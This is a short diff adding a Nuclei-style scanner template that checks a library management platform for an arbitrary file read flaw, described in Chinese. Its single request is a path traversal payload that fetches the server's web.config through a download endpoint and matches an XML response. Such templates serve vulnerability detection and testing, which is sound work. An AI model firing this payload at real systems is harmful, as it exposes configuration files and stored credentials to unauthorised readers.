@@ -1,0 +1,18 @@
+id: tsglpt-Template-fileread
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 图书馆管理平台Template存在任意文件读取漏洞
+  reference:
+    - https://www.yuque.com/hacktwo/dtdx2v/kxeo2dmroge6w03q>
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Api/Lib/Download/Template?fileName=Template/../../../web.config"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml'
